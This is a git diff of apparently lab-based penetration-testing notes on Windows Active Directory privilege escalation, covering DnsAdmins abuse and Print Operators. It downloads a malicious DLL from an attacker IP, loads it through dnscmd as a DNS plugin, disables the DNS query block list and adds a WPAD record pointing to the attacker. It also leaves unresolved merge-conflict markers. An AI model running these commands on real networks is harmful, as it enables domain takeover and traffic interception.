@@ -92,7 +92,8 @@ python3 -m http.server 7777
 ```Powershell
 wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
 Get-ADGroupMember -Identity DnsAdmins
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
+reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
 ```
 
 Now finding the SID and Checking the permissions on the DNS specs.
@@ -118,3 +119,12 @@ Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreigh
 Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
 ```
 
+<<<<<<< HEAD
+=======
+# Print Operators
+
+`SeLoadDriverPrivilege`
+
+[Loading driver Tool](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
+
+>>>>>>> origin/main
